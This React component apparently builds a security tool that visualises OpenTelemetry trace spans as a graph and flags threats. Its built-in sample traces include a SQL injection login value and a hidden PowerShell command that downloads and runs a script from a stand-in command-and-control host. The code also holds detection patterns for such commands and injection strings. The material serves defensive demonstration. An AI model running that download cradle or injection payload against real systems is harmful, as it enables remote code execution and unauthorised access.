import { useState, useMemo } from "react";

// Premium OTel attack trace samples
const SAMPLES = {
  sql_injection: [
    {
      "traceId": "t1-sql-inject-42",
      "spanId": "span-root",
      "parentId": null,
      "name": "HTTP POST /api/v1/login",
      "startTimeUnixNano": 1717520000000000000,
      "endTimeUnixNano": 1717520000550000000,
      "attributes": {
        "http.method": "POST",
        "http.status_code": 500,
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) sqlmap/1.8.2",
        "client.ip": "198.51.100.42"
      }
    },
    {
      "traceId": "t1-sql-inject-42",
      "spanId": "span-auth-check",
      "parentId": "span-root",
      "name": "auth.validate_credentials",
      "startTimeUnixNano": 1717520000020000000,
      "endTimeUnixNano": 1717520000510000000,
      "attributes": {
        "auth.username": "admin' OR '1'='1"
      }
    },
    {
      "traceId": "t1-sql-inject-42",
      "spanId": "span-db-query",
      "parentId": "span-auth-check",
      "name": "DB SELECT users",
      "startTimeUnixNano": 1717520000050000000,
      "endTimeUnixNano": 1717520000490000000,
      "attributes": {
        "db.system": "postgresql",
        "db.statement": "SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = ''",
        "db.error": "SyntaxError: unterminated quoted string at or near SELECT *"
      }
    }
  ],
  malware_download: [
    {
      "traceId": "t2-malware-run",
      "spanId": "span-process-start",
      "parentId": null,
      "name": "process.start explorer.exe",
      "startTimeUnixNano": 1717530000000000000,
      "endTimeUnixNano": 1717530003000000000,
      "attributes": {
        "process.pid": 4122,
        "process.path": "C:\\Windows\\explorer.exe"
      }
    },
    {
      "traceId": "t2-malware-run",
      "spanId": "span-chrome",
      "parentId": "span-process-start",
      "name": "process.spawn chrome.exe",
      "startTimeUnixNano": 1717530000200000000,
      "endTimeUnixNano": 1717530001500000000,
      "attributes": {
        "process.pid": 8920,
        "process.command_line": "chrome.exe --profile-directory=Default"
      }
    },
    {
      "traceId": "t2-malware-run",
      "spanId": "span-download",
      "parentId": "span-chrome",
      "name": "HTTP GET /invoices/pdf_generator.scr",
      "startTimeUnixNano": 1717530000500000000,
      "endTimeUnixNano": 1717530001200000000,
      "attributes": {
        "http.url": "http://malicious-domain.xyz/invoices/pdf_generator.scr",
        "http.status_code": 200,
        "response.bytes": 1048576
      }
    },
    {
      "traceId": "t2-malware-run",
      "spanId": "span-scr-execute",
      "parentId": "span-process-start",
      "name": "process.spawn pdf_generator.scr",
      "startTimeUnixNano": 1717530001600000000,
      "endTimeUnixNano": 1717530002900000000,
      "attributes": {
        "process.pid": 9410,
        "process.command_line": "pdf_generator.scr --install",
        "process.parent_pid": 4122
      }
    },
    {
      "traceId": "t2-malware-run",
      "spanId": "span-powershell",
      "parentId": "span-scr-execute",
      "name": "process.spawn powershell.exe",
      "startTimeUnixNano": 1717530001800000000,
      "endTimeUnixNano": 1717530002500000000,
      "attributes": {
        "process.pid": 9415,
        "process.command_line": "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://c2-server.xyz/payload.ps1')\""
      }
    },
    {
      "traceId": "t2-malware-run",
      "spanId": "span-c2-request",
      "parentId": "span-powershell",
      "name": "HTTP GET /payload.ps1",
      "startTimeUnixNano": 1717530002000000000,
      "endTimeUnixNano": 1717530002400000000,
      "attributes": {
        "http.url": "http://c2-server.xyz/payload.ps1",
        "http.status_code": 200
      }
    }
  ]
};

export default function TraceGraph() {
  const [inputText, setInputText] = useState("");
  const [parsedSpans, setParsedSpans] = useState(null);
  const [selectedNode, setSelectedNode] = useState(null);
  const [errorMsg, setErrorMsg] = useState("");

  const handleParse = (textToParse = inputText) => {
    try {
      setErrorMsg("");
      if (!textToParse.trim()) {
        setErrorMsg("Please paste some JSON or select a sample.");
        return;
      }
      const parsed = JSON.parse(textToParse);
      const spans = Array.isArray(parsed) ? parsed : (parsed.spans || [parsed]);
      
      // Clean and normalize span keys (snake_case/camelCase support)
      const cleaned = spans.map(s => ({
        spanId: s.spanId || s.span_id,
        parentId: s.parentId !== undefined ? s.parentId : s.parent_span_id,
        traceId: s.traceId || s.trace_id,
        name: s.name,
        startTimeUnixNano: Number(s.startTimeUnixNano || s.start_time_unix_nano || s.start_time || 0),
        endTimeUnixNano: Number(s.endTimeUnixNano || s.end_time_unix_nano || s.end_time || 0),
        attributes: s.attributes || s.tags || {}
      }));

      // Basic circular dependency validation
      const idSet = new Set(cleaned.map(x => x.spanId));
      cleaned.forEach(x => {
        if (x.parentId && !idSet.has(x.parentId)) {
          // If parent is not in the set, treat as root for local rendering
          x.parentId = null;
        }
      });

      setParsedSpans(cleaned);
      if (cleaned.length > 0) {
        setSelectedNode(cleaned[0]);
      }
    } catch (e) {
      setErrorMsg("Failed to parse JSON: " + e.message);
    }
  };

  const loadSample = (key) => {
    const jsonStr = JSON.stringify(SAMPLES[key], null, 2);
    setInputText(jsonStr);
    handleParse(jsonStr);
  };

  // Build tree nodes with coordinates
  const graphData = useMemo(() => {
    if (!parsedSpans || parsedSpans.length === 0) return null;

    // Build children mapping
    const spanMap = {};
    const rootNodes = [];
    
    parsedSpans.forEach(s => {
      spanMap[s.spanId] = { ...s, children: [] };
    });

    parsedSpans.forEach(s => {
      const node = spanMap[s.spanId];
      if (s.parentId && spanMap[s.parentId]) {
        spanMap[s.parentId].children.push(node);
      } else {
        rootNodes.push(node);
      }
    });

    // Simple layout calculation (Root on left, children branching right)
    // Compute depth and coordinates
    const nodes = [];
    const links = [];
    let verticalCounter = 0;

    const traverse = (node, depth = 0) => {
      const x = 50 + depth * 180;
      verticalCounter += 1;
      const y = verticalCounter * 65;

      const layoutNode = {
        ...node,
        x,
        y,
        durationMs: (node.endTimeUnixNano - node.startTimeUnixNano) / 1000000
      };
      
      nodes.push(layoutNode);

      node.children.forEach(child => {
        const childLayout = traverse(child, depth + 1);
        links.push({
          source: { x, y },
          target: { x: childLayout.x, y: childLayout.y }
        });
      });

      return layoutNode;
    };

    rootNodes.forEach(rn => traverse(rn, 0));

    // Calculate bounding box height
    const height = Math.max(verticalCounter * 65 + 50, 250);

    return { nodes, links, height };
  }, [parsedSpans]);

  // Automated contextual analysis logs
  const analysisLogs = useMemo(() => {
    if (!parsedSpans) return [];
    
    const logs = [];
    const anomalies = [];

    // Duration statistics
    const spansWithDuration = parsedSpans.map(s => {
      const durationMs = (s.endTimeUnixNano - s.startTimeUnixNano) / 1000000;
      return { ...s, durationMs };
    });

    // Chronological sort
    spansWithDuration.sort((a, b) => a.startTimeUnixNano - b.startTimeUnixNano);

    spansWithDuration.forEach(s => {
      const durationStr = s.durationMs >= 1000 
        ? `${(s.durationMs / 1000).toFixed(2)}s` 
        : `${s.durationMs.toFixed(1)}ms`;

      // 1. Process execute analysis
      if (s.name.includes("process.start") || s.name.includes("process.spawn")) {
        const cmd = s.attributes["process.command_line"] || s.attributes["process.path"] || s.name;
        logs.push({
          type: "process",
          message: `Process executed: ${cmd} (Duration: ${durationStr})`
        });

        // Flag highly suspicious commands
        const cmdLower = cmd.toLowerCase();
        if (cmdLower.includes("powershell") && (cmdLower.includes("-enc") || cmdLower.includes("downloadstring") || cmdLower.includes("iex"))) {
          anomalies.push({
            severity: "Critical",
            message: `Suspicious obfuscated or download powershell execution: \`${cmd}\``
          });
        }
        if (cmdLower.endsWith(".scr") || cmdLower.endsWith(".exe") && (cmdLower.includes("temp") || cmdLower.includes("appdata"))) {
          anomalies.push({
            severity: "High",
            message: `Process running binary from temp/appdata path: \`${cmd}\``
          });
        }
      }

      // 2. HTTP call analysis
      else if (s.name.startsWith("HTTP") || s.attributes["http.url"] || s.attributes["http.method"]) {
        const url = s.attributes["http.url"] || s.attributes["http.path"] || s.name;
        const status = s.attributes["http.status_code"] || "unknown status";
        logs.push({
          type: "network",
          message: `Network Request: ${s.attributes["http.method"] || "GET"} ${url} [Status: ${status}] (${durationStr})`
        });

        // Flag malicious/strange URL domains
        const urlLower = url.toLowerCase();
        if (urlLower.includes(".xyz") || urlLower.includes(".scr") || urlLower.includes("c2-server") || urlLower.includes("malicious")) {
          anomalies.push({
            severity: "Critical",
            message: `Outbound connection to highly suspicious host/extension: \`${url}\``
          });
        }
      }

      // 3. Database query analysis
      else if (s.name.includes("DB") || s.attributes["db.statement"]) {
        const stmt = s.attributes["db.statement"] || s.name;
        const system = s.attributes["db.system"] || "DB";
        logs.push({
          type: "database",
          message: `Database statement on ${system}: \`${stmt}\` (${durationStr})`
        });

        // Check for error or SQL injection patterns
        if (s.attributes["db.error"]) {
          anomalies.push({
            severity: "High",
            message: `Database transaction error: \`${s.attributes["db.error"]}\``
          });
        }
        if (stmt.toLowerCase().includes("' or '1'='1") || stmt.toLowerCase().includes("union select")) {
          anomalies.push({
            severity: "Critical",
            message: `SQL Injection pattern matched in statement: \`${stmt}\``
          });
        }
      }

      // 4. Default log entry
      else {
        logs.push({
          type: "internal",
          message: `Internal operation: ${s.name} (${durationStr})`
        });
      }

      // Slow span checking (> 2 seconds)
      if (s.durationMs > 2000) {
        anomalies.push({
          severity: "Medium",
          message: `Latency Bottleneck: Operation \`${s.name}\` took ${durationStr}.`
        });
      }
    });

    return { logs, anomalies };
  }, [parsedSpans]);

  const getNodeColor = (node) => {
    // If it has DB errors or suspicious keywords
    const attrsStr = JSON.stringify(node.attributes).toLowerCase();
    const nameLower = node.name.toLowerCase();
    
    if (node.attributes["db.error"] || attrsStr.includes("powershell.exe") || attrsStr.includes("c2-") || attrsStr.includes("'1'='1")) {
      return "#f43f5e"; // Red alert
    }
    if (nameLower.includes("select") || nameLower.includes("db ")) {
      return "#f59e0b"; // Yellow (DB)
    }
    if (nameLower.startsWith("http") || attrsStr.includes("http.url")) {
      return "#0ea5e9"; // Blue (Network)
    }
    return "#10b981"; // Green (Internal / safe)
  };

  return (
    <div style={{ marginTop: 24, display: "flex", flexDirection: "column", gap: 16 }}>
      <div style={styles.card}>
        <div style={{ display: "flex", justifyBetween: "space-between", alignItems: "center", marginBottom: 12, flexWrap: "wrap", gap: 12 }}>
          <div>
            <h3 style={{ fontSize: 13, fontWeight: 700, color: "#f1f5f9", fontFamily: "Syne, sans-serif" }}>OpenTelemetry Context Graph Generator</h3>
            <p style={{ fontSize: 11, color: "#64748b" }}>Input JSON telemetry traces to visualize execution chain and detect threats.</p>
          </div>
          <div style={{ display: "flex", gap: 8 }}>
            <button type="button" style={styles.btnSmall} onClick={() => loadSample("sql_injection")}>Sample: SQL Injection</button>
            <button type="button" style={styles.btnSmall} onClick={() => loadSample("malware_download")}>Sample: Malware Run</button>
          </div>
        </div>

        <textarea
          style={styles.textarea}
          rows={6}
          placeholder='Paste OpenTelemetry JSON span list here. Example: [{"spanId": "1", "name": "root", "parentId": null}]'
          value={inputText}
          onChange={(e) => setInputText(e.target.value)}
        />
        {errorMsg && <div style={styles.error}>{errorMsg}</div>}
        <button type="button" style={styles.btnPrimary} onClick={() => handleParse()}>Generate Execution Graph</button>
      </div>

      {graphData && (
        <div style={{ display: "grid", gridTemplateColumns: "1fr 340px", gap: 16 }}>
          {/* SVG Tree Column */}
          <div style={{ ...styles.card, padding: 0, overflow: "auto", border: "1px solid #1e3a5f" }}>
            <div style={{ padding: 12, borderBottom: "1px solid #1e3a5f", display: "flex", justifyContent: "space-between", fontSize: 10, color: "#64748b" }}>
              <span>SVG CONTEXT VISUALIZER (Click nodes for details)</span>
              <span>Roots &amp; Branches layout</span>
            </div>
            <div style={{ minWidth: 600, padding: 20 }}>
              <svg width="100%" height={graphData.height} style={{ background: "#060b14" }}>
                <defs>
                  <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
                    <feGaussianBlur stdDeviation="4" result="blur" />
                    <feComposite in="SourceGraphic" in2="blur" operator="over" />
                  </filter>
                </defs>

                {/* Draw connector lines */}
                {graphData.links.map((link, idx) => (
                  <path
                    key={idx}
                    d={`M ${link.source.x} ${link.source.y} C ${(link.source.x + link.target.x) / 2} ${link.source.y}, ${(link.source.x + link.target.x) / 2} ${link.target.y}, ${link.target.x} ${link.target.y}`}
                    fill="none"
                    stroke="#1e3a5f"
                    strokeWidth={2}
                    strokeDasharray="4,2"
                  />
                ))}

                {/* Draw node circles & text */}
                {graphData.nodes.map((node) => {
                  const color = getNodeColor(node);
                  const isSelected = selectedNode?.spanId === node.spanId;
                  return (
                    <g
                      key={node.spanId}
                      transform={`translate(${node.x}, ${node.y})`}
                      style={{ cursor: "pointer" }}
                      onClick={() => setSelectedNode(node)}
                    >
                      <circle
                        r={isSelected ? 10 : 7}
                        fill={color}
                        stroke={isSelected ? "#fff" : "transparent"}
                        strokeWidth={2}
                        filter="url(#glow)"
                      />
                      <text
                        x={14}
                        y={4}
                        fill={isSelected ? "#38bdf8" : "#cbd5e1"}
                        style={{
                          fontSize: 10,
                          fontFamily: "JetBrains Mono, monospace",
                          fontWeight: isSelected ? 700 : 500,
                        }}
                      >
                        {node.name.length > 25 ? `${node.name.substring(0, 23)}...` : node.name}
                      </text>
                      <text
                        x={14}
                        y={14}
                        fill="#475569"
                        style={{
                          fontSize: 8,
                          fontFamily: "JetBrains Mono, monospace",
                        }}
                      >
                        {node.durationMs.toFixed(1)}ms
                      </text>
                    </g>
                  );
                })}
              </svg>
            </div>
          </div>

          {/* Node Inspect Details Column */}
          <div style={styles.card}>
            <h4 style={styles.panelTitle}>Span Inspector</h4>
            {selectedNode ? (
              <div style={{ display: "flex", flexDirection: "column", gap: 10, fontSize: 11 }}>
                <div>
                  <div style={styles.label}>Span Name</div>
                  <div style={styles.val}>{selectedNode.name}</div>
                </div>
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                  <div>
                    <div style={styles.label}>Span ID</div>
                    <div style={styles.val}>{selectedNode.spanId}</div>
                  </div>
                  <div>
                    <div style={styles.label}>Parent ID</div>
                    <div style={styles.val}>{selectedNode.parentId || "None (Root)"}</div>
                  </div>
                </div>
                <div>
                  <div style={styles.label}>Duration</div>
                  <div style={{ ...styles.val, color: "#38bdf8", fontWeight: 700 }}>
                    {selectedNode.durationMs >= 1000 
                      ? `${(selectedNode.durationMs / 1000).toFixed(3)} seconds` 
                      : `${selectedNode.durationMs.toFixed(2)} ms`}
                  </div>
                </div>
                <div>
                  <div style={styles.label}>Attributes / Tags</div>
                  <div style={styles.attributesList}>
                    {Object.keys(selectedNode.attributes).length === 0 ? (
                      <span style={{ color: "#475569" }}>No attributes</span>
                    ) : (
                      Object.entries(selectedNode.attributes).map(([k, v]) => (
                        <div key={k} style={{ marginBottom: 4 }}>
                          <span style={{ color: "#38bdf8" }}>{k}:</span>{" "}
                          <span style={{ color: "#cbd5e1", wordBreak: "break-all" }}>{String(v)}</span>
                        </div>
                      ))
                    )}
                  </div>
                </div>
              </div>
            ) : (
              <div style={{ color: "#475569", fontSize: 11 }}>Select a node in the graph to view attributes.</div>
            )}
          </div>
        </div>
      )}

      {/* Analysis Logs and Threat Intelligence Report */}
      {analysisLogs.logs.length > 0 && (
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
          {/* Detailed sequential logs */}
          <div style={styles.card}>
            <h4 style={styles.panelTitle}>Trace Execution Logs</h4>
            <div style={styles.logsBox}>
              {analysisLogs.logs.map((log, i) => (
                <div key={i} style={styles.logRow}>
                  <span style={{ ...styles.logTypePill, ...styles[log.type] }}>{log.type}</span>
                  <span style={{ color: "#cbd5e1" }}>{log.message}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Critical Security Anomalies */}
          <div style={styles.card}>
            <h4 style={{ ...styles.panelTitle, color: "#fca5a5" }}>Security Assessment &amp; Anomalies</h4>
            <div style={styles.logsBox}>
              {analysisLogs.anomalies.length === 0 ? (
                <div style={{ color: "#10b981", fontSize: 11, padding: 8 }}>
                  ✓ No critical security anomalies detected in this execution trace.
                </div>
              ) : (
                analysisLogs.anomalies.map((anom, i) => (
                  <div key={i} style={styles.anomalyRow}>
                    <span style={styles.anomPill}>{anom.severity}</span>
                    <span style={{ color: "#f87171" }}>{anom.message}</span>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

const styles = {
  card: {
    backgroundColor: "#0a1628",
    border: "1px solid #1e3a5f",
    borderRadius: 6,
    padding: 16,
  },
  textarea: {
    width: "100%",
    backgroundColor: "#0d1928",
    border: "1px solid #1e3a5f",
    borderRadius: 4,
    color: "#e2e8f0",
    padding: 10,
    fontSize: 12,
    fontFamily: "monospace",
    outline: "none",
    marginBottom: 12,
  },
  btnSmall: {
    backgroundColor: "#1e3a5f",
    color: "#7dd3fc",
    border: "1px solid #1e5a8f",
    borderRadius: 3,
    padding: "4px 10px",
    fontSize: 10,
    fontFamily: "inherit",
    fontWeight: 600,
    cursor: "pointer",
  },
  btnPrimary: {
    backgroundColor: "#0ea5e9",
    color: "#fff",
    border: "none",
    borderRadius: 4,
    padding: "8px 16px",
    fontSize: 11,
    fontWeight: 700,
    fontFamily: "inherit",
    letterSpacing: "0.08em",
    textTransform: "uppercase",
    cursor: "pointer",
  },
  error: {
    color: "#f87171",
    fontSize: 11,
    marginBottom: 10,
  },
  panelTitle: {
    fontSize: 12,
    fontWeight: 700,
    fontFamily: "Syne, sans-serif",
    color: "#e2e8f0",
    borderBottom: "1px solid #1e3a5f",
    paddingBottom: 8,
    marginBottom: 12,
    textTransform: "uppercase",
    letterSpacing: "0.05em",
  },
  label: {
    fontSize: 9,
    fontWeight: 600,
    color: "#475569",
    textTransform: "uppercase",
    letterSpacing: "0.1em",
    marginBottom: 2,
  },
  val: {
    color: "#e2e8f0",
    fontSize: 12,
    marginBottom: 8,
  },
  attributesList: {
    maxHeight: 180,
    overflowY: "auto",
    backgroundColor: "#060b14",
    border: "1px solid #1e3a5f",
    borderRadius: 4,
    padding: 8,
    fontFamily: "monospace",
    fontSize: 10,
  },
  logsBox: {
    maxHeight: 280,
    overflowY: "auto",
    display: "flex",
    flexDirection: "column",
    gap: 8,
  },
  logRow: {
    display: "flex",
    gap: 8,
    alignItems: "flex-start",
    fontSize: 11,
    lineHeight: 1.4,
    borderBottom: "1px solid #0d1928",
    paddingBottom: 6,
  },
  logTypePill: {
    fontSize: 8,
    fontWeight: 700,
    textTransform: "uppercase",
    padding: "2px 6px",
    borderRadius: 3,
    minWidth: 55,
    textAlign: "center",
  },
  process: { backgroundColor: "#1e1b4b", color: "#818cf8" },
  network: { backgroundColor: "#0c4a6e", color: "#38bdf8" },
  database: { backgroundColor: "#451a03", color: "#fb923c" },
  internal: { backgroundColor: "#064e3b", color: "#34d399" },
  
  anomalyRow: {
    display: "flex",
    gap: 8,
    alignItems: "flex-start",
    fontSize: 11,
    lineHeight: 1.4,
    backgroundColor: "rgba(127, 29, 29, 0.2)",
    border: "1px solid rgba(220, 38, 38, 0.4)",
    padding: 8,
    borderRadius: 4,
  },
  anomPill: {
    backgroundColor: "#7f1d1d",
    color: "#fca5a5",
    fontSize: 8,
    fontWeight: 700,
    padding: "2px 6px",
    borderRadius: 3,
  }
};
